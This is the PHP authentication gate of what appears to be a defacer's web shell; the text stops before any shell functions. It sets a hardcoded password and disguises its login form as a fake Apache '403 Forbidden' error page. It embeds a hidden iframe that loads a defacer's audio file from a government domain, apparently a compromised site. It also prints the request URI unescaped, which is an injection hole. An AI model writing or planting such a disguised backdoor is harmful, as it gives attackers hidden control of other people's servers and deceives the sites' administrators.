<?php
$pass = "ari313";
session_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
<?php
if (!empty($_GET['array']) &&  $_GET['array'] == "logout") {session_destroy();unset ($_SESSION['pass']);}

$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass) 
{
    if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }
    else 
    {
        echo '<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
        <link href="" rel="stylesheet" type="text/css">
	<meta charset="utf-8">
	<title> 403 Forbidden </title>
	<style>
body{
	margin: 0;
	padding: 0;
	font-family: fantasy;
        background: url(http://);
        background-size: 350px 300px;
	background-color: white;
}
input[type = "text"]{
       background: none; 
       color: black; 
       border: 2px solid transparent;
       margin: 1px auto;
       padding-left: 1px;
       font-family: fantasy;
       font-size: 38px;
       width: 200px;
       font-weight: 900;
}
</style>
<style type="text/css">@import url("https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2P|Rationale")
</style>
</head>
<iframe width="0" height="0" src="https://www.suhunan.sukabumikab.go.id/defacer-kampungan.mp3" frameborder="0" allowfullscreen></iframe>
<body>
<link href="https://fonts.googleapis.com/css?family=Lacquer|&display=swap" rel="stylesheet"><font-family="sans serif>'; ?>
<?php
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<?php
	echo '<form class="box" action="'.$_SERVER['PHP_SELF'].'" method="post">'; ?> <hr color="white">
<b><input type="text" name="pass" value="Forbidden"></b>
<p>&nbsp;You don't have permission to access <?php print $errorforbidden; ?>
 on this server.</p>
<p>&nbsp;Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
<i>&nbsp;Apache/2.2.14 (Ubuntu) Server at localhost Port 80</i>
<?php
echo '</form>
</body>
</html> ';
        exit;
    }
}
?>

<style type="text/css">@font-face { font-family: 'Iceberg'; font-style: normal; font-weight: 400; src: local('Iceberg'), local('Iceberg-Regular'), url(https://fonts.gstatic.com/s/iceberg/v7/8QIJdijAiM7o-qnZiI8EqprnEO0.woff